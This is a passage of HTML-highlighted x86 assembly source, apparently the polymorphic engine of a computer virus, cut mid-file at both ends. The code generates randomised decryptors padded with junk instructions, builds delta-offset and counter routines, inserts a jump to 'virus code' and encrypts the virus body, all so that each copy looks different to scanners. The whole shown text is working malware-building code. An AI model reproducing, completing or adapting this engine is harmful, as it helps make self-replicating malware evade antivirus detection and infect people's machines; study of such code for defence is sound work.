</span><span class="sc5">get_size_ok</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Where to put decryptor code</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_decryptor</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Lets begin inserting some shit</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                
                </span><span class="sc1">;Choose a random decryptor style</span><span class="sc0">
                </span><span class="sc1">;Each style uses the same build procedures, but</span><span class="sc0">
                </span><span class="sc1">;in diferent order</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_styles</span><span class="sc4">-</span><span class="sc5">tbl_styles</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_styles</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Generator for decryptor styles</span><span class="sc0">

                </span><span class="sc1">;Build initialization code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_style_code</span><span class="sc0">

                </span><span class="sc1">;Set the loop point in the middle of nowhere</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">loop_point</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc1">;Build loop code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">00000004</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_style_code</span><span class="sc0">

                </span><span class="sc1">;Insert a jump to virus code</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem_Base</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">

                </span><span class="sc1">;Some garbage</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">

                </span><span class="sc1">;Now do encryption</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem_Base</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">                                
</span><span class="sc5">loop_hide_code</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">perform_crypt</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">                
</span><span class="sc5">loop_copy_res</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_copy_res</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">loop_hide_code</span><span class="sc0">

                </span><span class="sc1">;Exit polymorphic engine</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generator for decryptor styles</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_style_code</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">gen_style_code</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Perform encryption</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">perform_crypt</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Place for encryption code</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Get delta offset</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_get_delta</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;This is the CALL opcode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Save the place for the calling address</span><span class="sc0">

                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta_call</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc1">;Generate some random data</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_rnd_block</span><span class="sc0">

                </span><span class="sc1">;Get displacement from CALL instruction to destination</span><span class="sc0">
                </span><span class="sc1">;address</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc1">;Put destination address after CALL opcode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">00000004h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Generate some garbage code into destination address</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">

                </span><span class="sc1">;Choose method</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_delta_mode</span><span class="sc4">-</span><span class="sc5">tbl_delta_mode</span><span class="sc4">)/</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd_range</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_delta_mode</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">delta_method_1</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Generate:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       call get_delta</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       get_delta:</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       pop index_reg</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_pop_index</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">delta_method_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Generate:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       call get_delta</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       get_delta:</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       pop reg_1</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       mov reg_index,reg_1</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_pop_reg_1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Bh</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">delta_method_3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;Generate:</span><span class="sc0">
                </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc1">;       call get_delta</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       get_delta:</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       pop reg_1</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       push reg_1</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">
                </span><span class="sc1">;       pop reg_index</span><span class="sc0">
                </span><span class="sc1">;       ...</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_pop_reg_1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_pop_index</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">gen_pop_index</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate pop reg_index + garbage</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">gen_pop_reg_1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;Generate pop reg_1 + garbage</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_valid_reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_MASK</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gen_garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

                </span><span class="sc1">;Restore aux reg state</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">REG_FLAGS</span><span class="sc4">],</span><span class="sc5">REG_READ_ONLY</span><span class="sc0">

                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Fix pointer</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_fix_ptr</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Get displacement + offset of code to decrypt</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem_Base</span><span class="sc4">+</span><span class="sc5">mem_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta_call</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Check direction</span><span class="sc0">

                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_DIRECTION</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fix_dir_ok</span><span class="sc0">

                </span><span class="sc1">;Direction is from top to bottom</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oper_size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">fix_dir_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc1">;Fix using ADD or SUB</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fix_with_sub</span><span class="sc0">

</span><span class="sc5">fix_with_add</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Generate ADD reg_index,fix_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C081h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">fix_done</span><span class="sc0">

</span><span class="sc5">fix_with_sub</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Generate SUB reg_index,-fix_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0E881h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">index_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">fix_done</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Load counter</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_load_ctr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;Easy now, just move counter random initial value</span><span class="sc0">
                </span><span class="sc1">;into counter reg and calc end_value</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">counter_mask</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fixed_size2ecx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd32</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">],</span><span class="sc5">CRYPT_CDIR</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">counter_down</span><span class="sc0">
</span><span class="sc5">counter_up</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">done_ctr_dir</span><span class="sc0">
</span><span class="sc5">counter_down</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">done_ctr_dir</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">end_value</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">
</span><span class="sc1">;Generate decryptor action: Decrypt</span><span class="sc0">
</span><span class="sc1">;ииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииииии</span><span class="sc0">

</span><span class="sc5">gen_decrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc1">;Check if we are going to use a displacement</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ptr_disp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">more_complex</span><span class="sc0">

                </span><span class="sc1">;Choose generator for [reg] indexing mode</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">tbl_idx_reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_magic</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">you_got_it</span><span class="sc0">

</span><span class="sc5">more_complex</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;More fun?!?!</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">build_flags</span><span class="sc4">]</span><span class="sc0">
